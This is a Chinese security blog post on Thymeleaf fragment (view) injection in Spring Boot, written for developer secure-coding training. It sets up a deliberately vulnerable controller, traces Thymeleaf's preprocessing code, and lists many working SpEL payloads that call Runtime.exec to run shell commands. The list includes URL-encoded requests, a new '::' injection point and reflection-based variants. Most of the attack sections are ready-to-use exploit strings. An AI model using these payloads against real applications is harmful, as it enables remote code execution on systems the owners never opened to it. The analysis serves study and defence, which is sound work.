@@ -1,0 +1,162 @@
+<div class="detail_content markdown-body editormd-preview-container" id="markdown-body">
+<div id="app">
+<p>最近需要给研发部门的开发GG们作一场关于Java安全编码的培训，一方面后端开发使用Springboot+thymeleaf框架较多，因此通过代码示例以及漏洞演示加深理解。借此机会，又再去学习了下大佬们关于Thymeleaf这个漏洞的研究。<br/>
+  本文针对已有payload的执行原理和过程在代码层面进行了一些分析，找出新的注入点并阐述扩展新payload的一些方法和姿势，仅此而已。另外由于Thymeleaf 介绍文章很多，就不赘述了，部分文章和观点给我提供了很多帮助，一并附在最后，就不一一致谢了，最后感谢你们的无私奉献yyds～。</p>
+<h1 data-content="1" id="1dede8a3cdcd1aed6d5b4d04e3b8408a">0x01 环境配置</h1>
+<p>无一例外，我也是参考这个<a href="https://github.com/veracode-research/spring-view-manipulation/" target="_blank">https://github.com/veracode-research/spring-view-manipulation/</a> 搭建的，核心代码如下：</p>
+<div class="highlight"><pre><span></span><span class="nd">@GetMapping</span><span class="o">(</span><span class="s">"/path"</span><span class="o">)</span>
+<span class="kd">public</span> <span class="n">String</span> <span class="nf">path</span><span class="o">(</span><span class="nd">@RequestParam</span> <span class="n">String</span> <span class="n">lang</span><span class="o">)</span> <span class="o">{</span>
+    <span class="k">return</span> <span class="s">"user/"</span> <span class="o">+</span> <span class="n">lang</span> <span class="o">+</span> <span class="s">"/welcome"</span><span class="o">;</span> <span class="c1">//template path is tainted</span>
+<span class="o">}</span>
+</pre></div>
+<p>正常访问的话其实会看到报错信息，因为拼接后的模板映射到的文件路径-&gt;/templates/user/hello/welcome.html 找不到，所以直接会报错。现实中这个漏洞直接利用的场景不太多，几乎都是返回模板展示的动态内容（通常模板文件中用${..}动态渲染变量），而根据输入模板名称动态返回模板文件的场景就不是很多了（～～有争议也别打我，先打开发）。</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20210703152753-2de74fde-dbd0-1.png"/></p>
+<h1 data-content="1" id="eefa1dcde1f48dcd54d326c439e2dacd">0x02 Fragment 注入通用payload</h1>
+<p>如果这里的控制层用的是@Controller 进行注解的话，使用如下的payload 即可触发命令执行。</p>
+<div class="highlight"><pre><span></span><span class="n">__$</span><span class="o">{</span><span class="k">new</span> <span class="n">java</span><span class="o">.</span><span class="na">util</span><span class="o">.</span><span class="na">Scanner</span><span class="o">(</span><span class="n">T</span><span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">Runtime</span><span class="o">).</span><span class="na">getRuntime</span><span class="o">().</span><span class="na">exec</span><span class="o">(</span><span class="s">"id"</span><span class="o">).</span><span class="na">getInputStream</span><span class="o">()).</span><span class="na">next</span><span class="o">()}</span><span class="n">__</span><span class="o">::.</span><span class="na">x</span>
+</pre></div>
+<p>需要注意的是要进行urlencode编码：</p>
+<div class="highlight"><pre><span></span><span class="nl">http:</span><span class="c1">//ip:port/path?lang=__$%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%22whoami%22).getInputStream()).next()%7d__::.x</span>
+</pre></div>
+<p>发送请求后执行id 命令后回显<br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20210706162716-f8b7a78a-de33-1.png"/><br/>
+其实后面的.x 不需要也可以，也就是只有:: 这个也是可以的（不过是不返回执行命令后的结果了，写文件是可以的，以下所有payload均不再根据::单独列出），有些文章可是瞎写。例如payload 是这样也是可以的。</p>
+<div class="highlight"><pre><span></span><span class="n">__$</span><span class="o">{</span><span class="k">new</span> <span class="n">java</span><span class="o">.</span><span class="na">util</span><span class="o">.</span><span class="na">Scanner</span><span class="o">(</span><span class="n">T</span><span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">Runtime</span><span class="o">).</span><span class="na">getRuntime</span><span class="o">().</span><span class="na">exec</span><span class="o">(</span><span class="s">"id"</span><span class="o">).</span><span class="na">getInputStream</span><span class="o">()).</span><span class="na">next</span><span class="o">()}</span><span class="n">__</span><span class="o">::</span>
+
+<span class="n">__$</span><span class="o">{</span><span class="k">new</span> <span class="n">java</span><span class="o">.</span><span class="na">util</span><span class="o">.</span><span class="na">Scanner</span><span class="o">(</span><span class="n">T</span><span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">Runtime</span><span class="o">).</span><span class="na">getRuntime</span><span class="o">().</span><span class="na">exec</span><span class="o">(</span><span class="s">"touch executed"</span><span class="o">).</span><span class="na">getInputStream</span><span class="o">()).</span><span class="na">next</span><span class="o">()}</span><span class="n">__</span><span class="o">::</span>
+</pre></div>
+<p>虽然报错了，抛出的是fragment section 异常，但前面的代码已经执行完了才会到这一步，后面会有相应的代码分析。<br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20210706162716-f8e2643e-de33-1.png"/><br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20210706162716-f9018bde-de33-1.png"/></p>
+<h1 data-content="1" id="a5a285b477211049b8d5541afb1fe037">0x03 关于为什么这里只能用 <code>__${…}__</code> 而不能是 <code>${expr}/${{expr}}</code>
+</h1>
+<p>首先是被误用，导致后续即使代码不是这样写（这个下文会提到），也都沿用这个方式作为解析必要条件。因为当初这个大佬写的代码中 return的是 "user/" + lang + "/welcome"; 这个代表是/templates/user 目录下的模板，而<code>__${…}__</code> 是 thymeleaf 中的预处理表达式，也就是先处理这个再把处理后的结果作为参数带入。而因为templateName 已经有"user/" 了所以这里必须用 <code>__${…}__</code> 包装下才能正常被解析，这个可以从代码中比较直观看出来：</p>
+<div class="highlight"><pre><span></span><span class="cm">/**  StandardFragmentProcessor  **/</span>
+<span class="kd">final</span> <span class="n">FragmentSelection</span> <span class="n">fragmentSelection</span> <span class="o">=</span>
+                <span class="n">FragmentSelectionUtils</span><span class="o">.</span><span class="na">parseFragmentSelection</span><span class="o">(</span><span class="n">configuration</span><span class="o">,</span> <span class="n">processingContext</span><span class="o">,</span> <span class="n">standardFragmentSpec</span><span class="o">);</span>
+</pre></div>
+<p>继续调用StandardExpressionPreprocessor#preprocess()；<br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20210706162716-f91bea10-de33-1.png"/><br/>
+preprocess(预处理）方法首先会检查input（也就是templateName) 有没有"_" 下划线这个字符，没有的话就直接原样返回了,否则继续往下执行。</p>
+<div class="highlight"><pre><span></span><span class="kd">final</span> <span class="n">String</span> <span class="n">preprocessedInput</span> <span class="o">=</span>
+                <span class="n">StandardExpressionPreprocessor</span><span class="o">.</span><span class="na">preprocess</span><span class="o">(</span><span class="n">configuration</span><span class="o">,</span> <span class="n">processingContext</span><span class="o">,</span> <span class="n">input</span><span class="o">);</span>
+        <span class="k">if</span> <span class="o">(</span><span class="n">configuration</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
+            <span class="kd">final</span> <span class="n">FragmentSelection</span> <span class="n">cachedFragmentSelection</span> <span class="o">=</span>
+                    <span class="n">ExpressionCache</span><span class="o">.</span><span class="na">getFragmentSelectionFromCache</span><span class="o">(</span><span class="n">configuration</span><span class="o">,</span> <span class="n">preprocessedInput</span><span class="o">);</span>
+            <span class="k">if</span> <span class="o">(</span><span class="n">cachedFragmentSelection</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
+                <span class="k">return</span> <span class="n">cachedFragmentSelection</span><span class="o">;</span>
+            <span class="o">}</span>
+        <span class="o">}</span>
+<span class="kd">final</span> <span class="n">FragmentSelection</span> <span class="n">fragmentSelection</span> <span class="o">=</span>
+                <span class="n">FragmentSelectionUtils</span><span class="o">.</span><span class="na">internalParseFragmentSelection</span><span class="o">(</span><span class="n">preprocessedInput</span><span class="o">.</span><span class="na">trim</span><span class="o">());</span>
+</pre></div>
+<div class="highlight"><pre><span></span><span class="cm">/** StandardExpressionPreprocessor **/</span>
+<span class="kd">static</span> <span class="n">String</span> <span class="nf">preprocess</span><span class="o">(</span><span class="kd">final</span> <span class="n">Configuration</span> <span class="n">configuration</span><span class="o">,</span>
+            <span class="kd">final</span> <span class="n">IProcessingContext</span> <span class="n">processingContext</span><span class="o">,</span> <span class="kd">final</span> <span class="n">String</span> <span class="n">input</span><span class="o">)</span> <span class="o">{</span>
+
+        <span class="k">if</span> <span class="o">(</span><span class="n">input</span><span class="o">.</span><span class="na">indexOf</span><span class="o">(</span><span class="n">PREPROCESS_DELIMITER</span><span class="o">)</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="o">)</span> <span class="o">{</span>
+            <span class="c1">// Fail quick</span>
+            <span class="k">return</span> <span class="n">input</span><span class="o">;</span>
+        <span class="o">}</span>
+    <span class="kd">final</span> <span class="n">IStandardExpressionParser</span> <span class="n">expressionParser</span> <span class="o">=</span> <span class="n">StandardExpressions</span><span class="o">.</span><span class="na">getExpressionParser</span><span class="o">(</span><span class="n">configuration</span><span class="o">);</span>
+        <span class="k">if</span> <span class="o">(!(</span><span class="n">expressionParser</span> <span class="k">instanceof</span> <span class="n">StandardExpressionParser</span><span class="o">))</span> <span class="o">{</span>
+            <span class="c1">// Preprocess will be only available for the StandardExpressionParser, because the preprocessor</span>
+            <span class="c1">// depends on this specific implementation of the parser.</span>
+            <span class="k">return</span> <span class="n">input</span><span class="o">;</span>
+        <span class="o">}</span>
+<span class="c1">//部分省略</span>
+    <span class="kd">final</span> <span class="n">IStandardExpression</span> <span class="n">expression</span> <span class="o">=</span>
+                        <span class="n">StandardExpressionParser</span><span class="o">.</span><span class="na">parseExpression</span><span class="o">(</span><span class="n">configuration</span><span class="o">,</span> <span class="n">processingContext</span><span class="o">,</span> <span class="n">expressionText</span><span class="o">,</span> <span class="kc">false</span><span class="o">);</span>
+                <span class="k">if</span> <span class="o">(</span><span class="n">expression</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
+                    <span class="k">return</span> <span class="kc">null</span><span class="o">;</span>
+                <span class="o">}</span>
+
+                <span class="kd">final</span> <span class="n">Object</span> <span class="n">result</span> <span class="o">=</span>
+                    <span class="n">expression</span><span class="o">.</span><span class="na">execute</span><span class="o">(</span><span class="n">configuration</span><span class="o">,</span> <span class="n">processingContext</span><span class="o">,</span> <span class="n">StandardExpressionExecutionContext</span><span class="o">.</span><span class="na">PREPROCESSING</span><span class="o">);</span>
+<span class="c1">//后续省略</span>
+</pre></div>
+<p>用 <code>${}</code> 返回preprocessedInput，用<code>__${}__</code> 返回preprocessedInput2（用以区分）</p>
+<div class="highlight"><pre><span></span><span class="n">preprocessedInput</span><span class="o">=</span><span class="s">"user/${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec("</span><span class="n">id</span><span class="s">").getInputStream()).next()}::x/welcome"</span>
+
+<span class="k">if</span> <span class="n">use</span> <span class="n">with</span> <span class="n">__$</span><span class="o">{</span><span class="n">expr</span><span class="o">}</span><span class="n">__</span> <span class="n">syntax</span>  <span class="n">instead</span>
+<span class="n">preprocessedInput2</span><span class="o">=</span><span class="s">"user/shexxxao::x/welcome"</span>
+</pre></div>
+<p>然后继续运行到internalParseFragmentSelection()，主要实现去除空格等一系列检查任务，重要的一步是检查是否包含“::" 操作符号，这个符号其实是定位符号，用来查找template 中的fragment section 部分。<br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20210706162717-f933e0b6-de33-1.png"/><br/>
+其实最早在ThymeleafView#renderFragment()方法中就先判断了viewTemplateName 是否包含"::" 这个操作符号了，否则不会执行上面的parseFragmentSelection()过程，压根不会执行后续的Fragment 表达式解析了。<br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20210706162717-f95439f6-de33-1.png"/><br/>
+也因此为啥称为Fragment 注入，大都很它称为View 注入，当然只是我觉得用Fragment 比较符合这个漏洞产生原理，所以叫啥都行，并不重要。<br/>
+执行到最后会发现templateNameExpression 为user/${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec("id").getInputStream()).next()} 这个就无法解析，到这里就抛出异常了。（注意另外一个重要的参数—“fragmentSpecExpression”,这个后面也有一轮表达式解析的过程，因此::后面还可以插入表达式）<br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20210706162717-f96c4334-de33-1.png"/></p>
+<h1 data-content="1" id="21901242f054006349c5fe4ed3c48c6c">0x04 新的注入点“::”</h1>
+<p>在前面提到fragmentSpecExpression，这个其实后面对fragment 的参数进行了解析，核心代码如下：</p>
+<div class="highlight"><pre><span></span><span class="cm">/** StandardFragmentProcessor **/</span> 
+<span class="c1">// Resolve fragment parameters, if specified (null if not)</span>
+        <span class="kd">final</span> <span class="n">Map</span><span class="o">&lt;</span><span class="n">String</span><span class="o">,</span><span class="n">Object</span><span class="o">&gt;</span> <span class="n">fragmentParameters</span> <span class="o">=</span>
+                <span class="n">resolveFragmentParameters</span><span class="o">(</span><span class="n">configuration</span><span class="o">,</span><span class="n">processingContext</span><span class="o">,</span><span class="n">fragmentSelection</span><span class="o">.</span><span class="na">getParameters</span><span class="o">());</span>
+
+        <span class="k">if</span> <span class="o">(</span><span class="n">fragmentSelection</span><span class="o">.</span><span class="na">hasFragmentSelector</span><span class="o">())</span> <span class="o">{</span>
+
+            <span class="kd">final</span> <span class="n">Object</span> <span class="n">fragmentSelectorObject</span> <span class="o">=</span>
+                    <span class="n">fragmentSelection</span><span class="o">.</span><span class="na">getFragmentSelector</span><span class="o">().</span><span class="na">execute</span><span class="o">(</span><span class="n">configuration</span><span class="o">,</span> <span class="n">processingContext</span><span class="o">);</span>
+            <span class="k">if</span> <span class="o">(</span><span class="n">fragmentSelectorObject</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
+                <span class="k">throw</span> <span class="k">new</span> <span class="n">TemplateProcessingException</span><span class="o">(</span>
+                        <span class="s">"Evaluation of fragment selector from spec \""</span> <span class="o">+</span> <span class="n">standardFragmentSpec</span> <span class="o">+</span> <span class="s">"\" "</span> <span class="o">+</span> 
+                        <span class="s">"returned null."</span><span class="o">);</span>
+            <span class="o">}</span>
+</pre></div>
+<p>基于此，可以构造如下payload:(ps:由于无法直接回显，所以可以用写文件形式)</p>
+<div class="highlight"><pre><span></span><span class="mi">666</span><span class="o">::</span><span class="n">__$</span><span class="o">{</span><span class="n">T</span><span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">Runtime</span><span class="o">).</span><span class="na">getRuntime</span><span class="o">().</span><span class="na">exec</span><span class="o">(</span><span class="s">"touch 667"</span><span class="o">)}</span><span class="n">__</span>
+<span class="c1">//使用时同样需要url编码</span>
+</pre></div>
+<p>可以看到文件已经成功写入。<br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20210706162717-f995ed2e-de33-1.png"/></p>
+<h1 data-content="1" id="7ab9143c2b49777ab788ab10ff2424fc">0x11 环境配置(扩展）</h1>
+<p>看到大部分文章是这样配置的：</p>
+<div class="highlight"><pre><span></span><span class="nd">@GetMapping</span><span class="o">(</span><span class="s">"/path"</span><span class="o">)</span>
+<span class="kd">public</span> <span class="n">String</span> <span class="nf">path</span><span class="o">(</span><span class="nd">@RequestParam</span> <span class="n">String</span> <span class="n">lang</span><span class="o">)</span> <span class="o">{</span>
+    <span class="k">return</span> <span class="n">lang</span><span class="o">;</span> <span class="c1">//template path is tainted</span>
+<span class="o">}</span>
+</pre></div>
+<p>同样先正常访问看下响应内容：<br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20210706162717-f9b2bf3a-de33-1.png"/></p>
+<h1 data-content="1" id="6edfbb8bd84f21c498446bc79104fb2d">0x12 Fragment 注入通用payload1</h1>
+<p>根据上面分析后，发现其实并不一定需要<code>__${expr}__</code> 这种方式来包住payload ,可以直接用<code>${expr}</code> 或者<code>${{expr}}</code> 都是可以的。<br/>
+需要注意的是：除了<code>${expr}以及${{expr}}</code> 可以被Thymeleaf EL 引擎执行外，<code>*{expr}及*{{expr}}</code>也同样可以。<br/>
+payload1:</p>
+<div class="highlight"><pre><span></span><span class="n">$</span><span class="o">{</span><span class="k">new</span> <span class="n">java</span><span class="o">.</span><span class="na">util</span><span class="o">.</span><span class="na">Scanner</span><span class="o">(</span><span class="n">T</span><span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">Runtime</span><span class="o">).</span><span class="na">getRuntime</span><span class="o">().</span><span class="na">exec</span><span class="o">(</span><span class="s">"id"</span><span class="o">).</span><span class="na">getInputStream</span><span class="o">()).</span><span class="na">next</span><span class="o">()}::</span><span class="n">x</span>
+<span class="o">*{</span><span class="k">new</span> <span class="n">java</span><span class="o">.</span><span class="na">util</span><span class="o">.</span><span class="na">Scanner</span><span class="o">(</span><span class="n">T</span><span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">Runtime</span><span class="o">).</span><span class="na">getRuntime</span><span class="o">().</span><span class="na">exec</span><span class="o">(</span><span class="s">"id"</span><span class="o">).</span><span class="na">getInputStream</span><span class="o">()).</span><span class="na">next</span><span class="o">()}::</span><span class="n">x</span>
+</pre></div>
+<p>payload2:</p>
+<div class="highlight"><pre><span></span><span class="n">$</span><span class="o">{{</span><span class="k">new</span> <span class="n">java</span><span class="o">.</span><span class="na">util</span><span class="o">.</span><span class="na">Scanner</span><span class="o">(</span><span class="n">T</span><span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">Runtime</span><span class="o">).</span><span class="na">getRuntime</span><span class="o">().</span><span class="na">exec</span><span class="o">(</span><span class="s">"id"</span><span class="o">).</span><span class="na">getInputStream</span><span class="o">()).</span><span class="na">next</span><span class="o">()}}::</span><span class="n">x</span>
+<span class="o">*{{</span><span class="k">new</span> <span class="n">java</span><span class="o">.</span><span class="na">util</span><span class="o">.</span><span class="na">Scanner</span><span class="o">(</span><span class="n">T</span><span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">Runtime</span><span class="o">).</span><span class="na">getRuntime</span><span class="o">().</span><span class="na">exec</span><span class="o">(</span><span class="s">"id"</span><span class="o">).</span><span class="na">getInputStream</span><span class="o">()).</span><span class="na">next</span><span class="o">()}}::</span><span class="n">x</span>
+</pre></div>
+<p>同样能够执行预期结果：<br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20210706162718-f9cb2ca0-de33-1.png"/><br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20210706162718-f9eec0d4-de33-1.png"/></p>
+<h1 data-content="1" id="9a0eb231d727f12727d3d2a43966a085">0x13 Fragment 注入通用payload2</h1>
+<p>当然也可以用Java 反射来改造payload:</p>
+<div class="highlight"><pre><span></span><span class="n">__$</span><span class="o">{</span><span class="k">new</span> <span class="n">java</span><span class="o">.</span><span class="na">util</span><span class="o">.</span><span class="na">Scanner</span><span class="o">(</span><span class="n">T</span><span class="o">(</span><span class="n">String</span><span class="o">).</span><span class="na">getClass</span><span class="o">().</span><span class="na">forName</span><span class="o">(</span><span class="s">"java.lang.Runtime"</span><span class="o">).</span><span class="na">getMethod</span><span class="o">(</span><span class="s">"exec"</span><span class="o">,</span><span class="n">T</span><span class="o">(</span><span class="n">String</span><span class="o">[])).</span><span class="na">invoke</span><span class="o">(</span><span class="n">T</span><span class="o">(</span><span class="n">String</span><span class="o">).</span><span class="na">getClass</span><span class="o">().</span><span class="na">forName</span><span class="o">(</span><span class="s">"java.lang.Runtime"</span><span class="o">).</span><span class="na">getMethod</span><span class="o">(</span><span class="s">"getRuntime"</span><span class="o">).</span><span class="na">invoke</span><span class="o">(</span><span class="n">T</span><span class="o">(</span><span class="n">String</span><span class="o">).</span><span class="na">getClass</span><span class="o">().</span><span class="na">forName</span><span class="o">(</span><span class="s">"java.lang.Runtime"</span><span class="o">)),</span><span class="k">new</span> <span class="n">String</span><span class="o">[]{</span><span class="s">"/bin/bash"</span><span class="o">,</span><span class="s">"-c"</span><span class="o">,</span><span class="s">"id"</span><span class="o">}).</span><span class="na">getInputStream</span><span class="o">()).</span><span class="na">next</span><span class="o">()}</span><span class="n">__</span><span class="o">::</span><span class="n">x</span>
+</pre></div>
+<p>或者减少T(String)，即：</p>
+<div class="highlight"><pre><span></span><span class="n">__$</span><span class="o">{</span><span class="k">new</span> <span class="n">java</span><span class="o">.</span><span class="na">util</span><span class="o">.</span><span class="na">Scanner</span><span class="o">(</span><span class="n">Class</span><span class="o">.</span><span class="na">forName</span><span class="o">(</span><span class="s">"java.lang.Runtime"</span><span class="o">).</span><span class="na">getMethod</span><span class="o">(</span><span class="s">"exec"</span><span class="o">,</span><span class="n">T</span><span class="o">(</span><span class="n">String</span><span class="o">[])).</span><span class="na">invoke</span><span class="o">(</span><span class="n">Class</span><span class="o">.</span><span class="na">forName</span><span class="o">(</span><span class="s">"java.lang.Runtime"</span><span class="o">).</span><span class="na">getMethod</span><span class="o">(</span><span class="s">"getRuntime"</span><span class="o">).</span><span class="na">invoke</span><span class="o">(</span><span class="n">Class</span><span class="o">.</span><span class="na">forName</span><span class="o">(</span><span class="s">"java.lang.Runtime"</span><span class="o">)),</span><span class="k">new</span> <span class="n">String</span><span class="o">[]{</span><span class="s">"/bin/bash"</span><span class="o">,</span><span class="s">"-c"</span><span class="o">,</span><span class="s">"id"</span><span class="o">}).</span><span class="na">getInputStream</span><span class="o">()).</span><span class="na">next</span><span class="o">()}</span><span class="n">__</span><span class="o">::</span><span class="n">x</span>
+</pre></div>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20210706162718-fa1cf4cc-de33-1.png"/><br/>
+同理列出其它相似的payload：</p>
+<p>a)用${expr}方式：</p>
+<div class="highlight"><pre><span></span><span class="n">$</span><span class="o">{</span><span class="k">new</span> <span class="n">java</span><span class="o">.</span><span class="na">util</span><span class="o">.</span><span class="na">Scanner</span><span class="o">(</span><span class="n">Class</span><span class="o">.</span><span class="na">forName</span><span class="o">(</span><span class="s">"java.lang.Runtime"</span><span class="o">).</span><span class="na">getMethod</span><span class="o">(</span><span class="s">"exec"</span><span class="o">,</span><span class="n">T</span><span class="o">(</span><span class="n">String</span><span class="o">[])).</span><span class="na">invoke</span><span class="o">(</span><span class="n">Class</span><span class="o">.</span><span class="na">forName</span><span class="o">(</span><span class="s">"java.lang.Runtime"</span><span class="o">).</span><span class="na">getMethod</span><span class="o">(</span><span class="s">"getRuntime"</span><span class="o">).</span><span class="na">invoke</span><span class="o">(</span><span class="n">Class</span><span class="o">.</span><span class="na">forName</span><span class="o">(</span><span class="s">"java.lang.Runtime"</span><span class="o">)),</span><span class="k">new</span> <span class="n">String</span><span class="o">[]{</span><span class="s">"/bin/bash"</span><span class="o">,</span><span class="s">"-c"</span><span class="o">,</span><span class="s">"id"</span><span class="o">}).</span><span class="na">getInputStream</span><span class="o">()).</span><span class="na">next</span><span class="o">()}::</span><span class="n">x</span>
+</pre></div>
+<p>b)及相应的 *{expr}方式：</p>
+<pre><code>*{new java.util.Scanner(Class.forName("java.lang.Runtime").getMethod("exec",T(String[])).invoke(Class.forName("java.lang.Runtime").getMethod("getRuntime").invoke(Class.forName("java.lang.Runtime")),new String[]{"/bin/bash","-c","id"}).getInputStream()).next()}::x</code></pre>
+<p>c)用${{expr}} 方式：</p>
+<div class="highlight"><pre><span></span><span class="n">$</span><span class="o">{{</span><span class="k">new</span> <span class="n">java</span><span class="o">.</span><span class="na">util</span><span class="o">.</span><span class="na">Scanner</span><span class="o">(</span><span class="n">Class</span><span class="o">.</span><span class="na">forName</span><span class="o">(</span><span class="s">"java.lang.Runtime"</span><span class="o">).</span><span class="na">getMethod</span><span class="o">(</span><span class="s">"exec"</span><span class="o">,</span><span class="n">T</span><span class="o">(</span><span class="n">String</span><span class="o">[])).</span><span class="na">invoke</span><span class="o">(</span><span class="n">Class</span><span class="o">.</span><span class="na">forName</span><span class="o">(</span><span class="s">"java.lang.Runtime"</span><span class="o">).</span><span class="na">getMethod</span><span class="o">(</span><span class="s">"getRuntime"</span><span class="o">).</span><span class="na">invoke</span><span class="o">(</span><span class="n">Class</span><span class="o">.</span><span class="na">forName</span><span class="o">(</span><span class="s">"java.lang.Runtime"</span><span class="o">)),</span><span class="k">new</span> <span class="n">String</span><span class="o">[]{</span><span class="s">"/bin/bash"</span><span class="o">,</span><span class="s">"-c"</span><span class="o">,</span><span class="s">"id"</span><span class="o">}).</span><span class="na">getInputStream</span><span class="o">()).</span><span class="na">next</span><span class="o">()}}::</span><span class="n">x</span>
+</pre></div>
+<p>d)及相应的*{{expr}}方式：</p>
+<pre><code>*{{new java.util.Scanner(Class.forName("java.lang.Runtime").getMethod("exec",T(String[])).invoke(Class.forName("java.lang.Runtime").getMethod("getRuntime").invoke(Class.forName("java.lang.Runtime")),new String[]{"/bin/bash","-c","id"}).getInputStream()).next()}}::x</code></pre>
+<h1 data-content="1" id="f3e017b6fa74c57c8fb900d9d39a4eaf">0xFF 参考文献</h1>
+<p>[1]. <a href="https://mp.weixin.qq.com/s/-KJijVbZGo6W7gLcve9IkQ" target="_blank">https://mp.weixin.qq.com/s/-KJijVbZGo6W7gLcve9IkQ</a><br/>
+[2]. <a href="https://github.com/veracode-research/spring-view-manipulation/" target="_blank">https://github.com/veracode-research/spring-view-manipulation/</a><br/>
+[3]. <a href="https://www.thymeleaf.org/doc/tutorials/3.0/thymeleafspring.html" target="_blank">https://www.thymeleaf.org/doc/tutorials/3.0/thymeleafspring.html</a><br/>
+[4]. <a href="https://www.cnblogs.com/hetianlab/p/13679645.html" target="_blank">https://www.cnblogs.com/hetianlab/p/13679645.html</a></p>
+</div>
+</div>
